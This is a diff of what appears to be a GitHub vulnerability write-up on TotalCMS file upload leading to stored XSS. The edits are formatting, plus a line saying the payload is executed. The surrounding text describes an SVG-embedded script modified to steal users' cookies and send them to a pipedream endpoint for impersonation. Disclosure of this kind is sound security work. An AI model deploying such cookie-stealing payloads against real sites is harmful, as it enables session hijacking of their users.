@@ -141,7 +141,9 @@ alert("XSS");
 As we see in the pipedream Request, we have obtained the request correctly.
 
 
+<br>
 We modify the payload to steal cookies and send them to the pipedream Request, so that we can impersonate the user.
+
 
 
 There is the payload:
@@ -167,6 +169,11 @@ xml:space="preserve">
 </script>   
 </svg>
 ```
+
+
+We execute it:
+
+<br>
 
 ![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/f4ac2d48-f957-4c5d-a173-053ba3097aec)
 
